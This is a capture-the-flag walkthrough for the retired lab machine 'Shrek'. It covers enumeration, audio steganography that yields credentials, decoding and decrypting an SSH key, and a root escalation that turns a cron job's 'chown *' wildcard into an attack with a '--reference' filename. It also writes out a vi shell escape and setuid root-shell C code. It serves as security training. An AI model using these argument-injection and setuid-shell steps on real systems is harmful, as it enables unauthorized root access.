# Shrek

This is the write-up for the box Shrek that got retired at the 3rd February 2018.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.47    shrek.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/shrek.nmap 10.10.10.47
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Unix)
|_http-title: Home
Service Info: OS: Unix
```

## Checking HTTP (Port 80)

On the web page there is a fan page for Shrek with pictures in the _Image Gallery_ and an _Upload Page_.
It is possible to upload pictures that forwards to _/upload.php_ and after a success, it displays this information:

![Upload successful](shrek_web-1.png)

When uploading a PHP shell, it still shows the success page, but it is not clear where the files are stored.
Lets enumerate for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.47 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the paths:
- /memes
- /uploads

The _/memes_ page has a bunch of images:

![Memes page](shrek_web-2.png)

Our uploaded files are not in _/uploads_ but instead different PHP, ASP and EXE files:

![Uploads page](shrek_web-3.png)

After downloading all, we check what kind of `file` they are:
```markdown
cow.php5:            data
legit.asp:           ASCII text, with very long lines, with CRLF, LF line terminators
lolol.asp:           ASCII text, with very long lines, with CRLF, LF line terminators
secret_ultimate.php: PHP script, ASCII text, with CRLF line terminators
shell.elf:           ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
shell.php:           data
siren.aspx:          HTML document, ASCII text
trll.exe:            PE32+ executable (GUI) x86-64, for MS Windows
```

The file _secret_ultimate.php_ refers in the code to a secret path:
```markdown
$end_path = site/secret_area_51 // friggin' finally found the secret dir!!
```

This path is another index page with one file called **Smash Mouth - All Star.mp3** which is a MP3 file with that particular song.

### Analyzing the MP3 file

After listening to the song, there is a part at the end of the song between 3:20 and 3:36 where it outputs static sound.
When hearing static sound, it probably has something hidden in that part.

This can be analyzed with different audio editor programs like **Audacity**.

Opening the file in Audacity and zooming in on the end part:

![Audacity cut end part](shrek_audacity-1.png)

Changing output to _Spectrogram_:

![Audacity cut end part](shrek_audacity-2.png)

Increasing the maximum frequency in the _Spectrogram Settings_:

![Audacity cut end part](shrek_audacity-3.png)

This shows even the frequency that can't be heard and normally is not used so the Spectrogram displays something:

![Audacity cut end part](shrek_audacity-4.png)

These look assumingly like credentials for **FTP**:
> donkey:d0nk3y1337!

## Checking FTP (Port 21)

The login on FTP works and `dir` shows a lot of files in the directory:
```markdown
-rw-r--r--    1 0        0           11264 Jan 01 15:52 0180e34259d846c4b521ddf1e285f53d.txt
-rw-r--r--    1 0        0           10240 Jan 01 15:52 02a4fc88256b4f8fbbef42ee70c98274.txt
-rw-r--r--    1 0        0           14336 Jan 01 15:52 1e308a17513e43b1b768972b3148d54d.txt
-rw-r--r--    1 0        0           12288 Jan 01 15:52 1f03a490d97440f4abaae234c93d5cd2.txt
-rw-r--r--    1 0        0            9246 Jan 01 15:52 216d9ec8787c409991ebbf426a74aeac.txt
-rw-r--r--    1 0        0            7168 Jan 01 15:52 265e3151d05344e9989fbec52432ca47.txt
-rw-r--r--    1 0        0           12288 Jan 01 15:52 28854e50429c48e1853d48875c139e0c.txt
-rw-r--r--    1 0        0            5120 Jan 01 15:52 2a5800f0d1c749caa1f36db29aaeefaa.txt
-rw-r--r--    1 0        0           13312 Jan 01 15:52 40259818b860408bbfb022724657a01a.txt
-rw-r--r--    1 0        0            7168 Jan 01 15:52 4a7cedd2b16548038e767a013fe8239f.txt
-rw-r--r--    1 0        0           13312 Jan 01 15:52 5ff5ae5e12ee4808a586a8b9c0240bc9.txt
-rw-r--r--    1 0        0            6144 Jan 01 15:52 6746e6ce79f341b78940983a3053ccff.txt
-rw-r--r--    1 0        0           14336 Jan 01 15:52 6fa2077bf09c485daa00e3f9ddcc9b86.txt
-rw-r--r--    1 0        0           10240 Jan 01 15:52 7bb1b8cd612e4ee09e4f36b6638fde9d.txt
-rw-r--r--    1 0        0            5120 Jan 01 15:52 7c5e61cd00da4e1d95f92a242ec59731.txt
-rw-r--r--    1 0        0           13312 Jan 01 15:52 9962d67c5b864f5d97404a9305ed2150.txt
-rw-r--r--    1 0        0            8192 Jan 01 15:52 a5b6c64121174498afc973a70924a894.txt
-rw-r--r--    1 0        0           14336 Jan 01 15:52 a65373423ec14dc09a424533f5805ea5.txt
-rw-r--r--    1 0        0            3072 Jan 01 15:52 b64f8f1c7afa49fa82119fec3cadb6bb.txt
-rw-r--r--    1 0        0            5120 Jan 01 15:52 bbadf3e0618e40a5be35379856153b39.txt
-rw-r--r--    1 0        0            4096 Jan 01 15:52 c835b6f9067841978d167902690f37f0.txt
-rw-r--r--    1 0        0           12288 Jan 01 15:52 d00ae57ba9724a3289b376024e9053ba.txt
-rw-r--r--    1 0        0           14766 Jan 01 15:52 d39264eb54dd421384c9735f69d64580.txt
-rw-r--r--    1 0        0            3072 Jan 01 15:52 d6cf21d838924280896d07591ee3e812.txt
-rw-r--r--    1 0        0            4096 Jan 01 15:52 de9c54111a3d4817a90fd07c79295cdb.txt
-rw-r--r--    1 0        0            5120 Jan 01 15:52 eacb0d5d91864014a0ed6af6f1caa4f4.txt
-rw-r--r--    1 0        0           13312 Jan 01 15:52 efb9e80891d8427eb2c06601eca270c5.txt
-rw-r--r--    1 0        0            9216 Jan 01 15:52 f08769e17a3c4879921e2254b2690956.txt
-rw-r--r--    1 0        0           11264 Jan 01 15:52 f51d88a787b348f0acf581090369f2a8.txt
-rw-r--r--    1 0        0            7168 Jan 01 15:52 f5fde3474bbc4dd98c6e80f1c4da876c.txt
-rw-r--r--    1 0        0           12288 Jan 01 15:52 ff9c1eb531e242098952c5d3eecd2266.txt
-rw-r--r--    1 0        0            1766 Aug 16  2017 key
```

The .txt files all have a 32 character long string as the filename which probably are MD5-hashes and the contents look like meaningless text.
The file _key_ is a private **RSA key** which is **AES-128-CBC** encrypted.
```markdown
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,94DC7309349E17F8ED6776ED69D6265A
(...)
```

### Analyzing the .txt files

To check if this is **Base64** encoded, we can decode one of the files:
```markdown
base64 -d 0180e34259d846c4b521ddf1e285f53d.txt
```

It outputs a bunch of gibberish, but it didn't output an error message which is interesting.
Lets base64 decode all of them:
```markdown
for i in `ls *.txt`; do echo $i; base64 -d $i > $i.b64; done
```

Two of the files are displaying an error that there is invalid input:
- 216d9ec8787c409991ebbf426a74aeac.txt
- d39264eb54dd421384c9735f69d64580.txt

Looking at those files there are some spaces that have some text in it that need to be base64 decoded separately:
```markdown
# 216d9ec8787c409991ebbf426a74aeac.txt:

echo -n UHJpbmNlQ2hhcm1pbmc= | base64 -d

## Output:
PrinceCharming
```

```markdown
# d39264eb54dd421384c9735f69d64580.txt:

echo -n J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc= | base64 -d

## Output:
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
```

All of this is probably needed for the _key_ file.

### Decrypting the RSA key file

To decrypt the RSA key we need the [Python module seccure](https://github.com/bwesterb/py-seccure).
```markdown
pip install seccure
```

Decrypting the key:
```python
import seccure

ciphertext = '\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'

seccure.decrypt(ciphertext, b"PrinceCharming")
```

The output is:
> The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec

We now know the password for the RSA key to SSH into the box as the user _sec_.
```markdown
chmod 600 key

ssh -i key sec@10.10.10.47
```

## Privilege Escalation

### Rabbit Hole

This part describes the rabbit hole of the box, which can be ignored.

Looking at the sudo privileges with the user _sec_, it shows that it is possible to execute **vi** as the user _farquad_:
```markdown
User sec may run the following commands on shrek:
    (farquad) NOPASSWD: /usr/bin/vi
```

Running `vi` as _farquad_ and starting a shell:
```markdown
sudo -u farquad /usr/bin/vi

# Command mode in vi
:!/bin/bash
```

In his home directory there is binary file called _mirror_ that outputs some text and has no special permissions.

### Incident Response methods

To find the real vulnerability we will use **Incident Response** methods to gain more information about the box as normal Linux Enumeration scripts won't find anything useful.

We imagine that the creator of the box is a hacker that left the _user.txt_ file in there. When looking for artifacts about what happened, the time of the creation of that file is very important. We need to know what happened before and after the creation of this file.
```markdown
-r--r--r-- 1 root root 33 Aug 22  2017 user.txt
```
```markdown
find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24 -ls 2>/dev/null
```

This command looks for all files that were modified two days before and after the creation of the file.
Most files in _/var/log_ can be ignored. The interesting files are:
```markdown
-rw-------   1  root     root     97 Aug 22  2017  /var/spool/cron/root
-rw-r--r--   1  root     root     91 Aug 22  2017  /usr/src/thoughts.txt
```

Now we know that there is a cronjob that belongs to root and we can't read and the file _thoughts.txt_ with a Shrek quote that does not give any hint.

After uploading and executing **Pspy** on the box, it becomes clear that every five minutes a `chown` command is run:
```markdown
/bin/sh -c cd /usr/src; /usr/bin/chown nobody:nobody *
```

When creating a file in _/usr/src_ and waiting for five minutes, the file will be owned by the user _nobody_.
The wildcard character at the end is what we will abuse.

We can abuse the `chown` command by giving it parameters with files, so it will interpret these files as parameters and will execute them.
```markdown
touch -- --reference=thoughts.txt
```

With the `--reference` parameter the `chown` command will use the given files owner and group as owner instead of the user _nobody_.
The owner and group of _thoughts.txt_ is root.

Lets create a simple C program so we can start a shell:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char *argv[] )
{
        setreuid(0, 0);
        execve("/bin/sh", NULL, NULL);
}   
```

Setting the **Setuid** bit, so it will run as root:
```markdown
chmod 4755 shell
```

After five minutes, the cronjob will run and the files are owned by root.
Executing the `shell` binary will result in a shell as root!
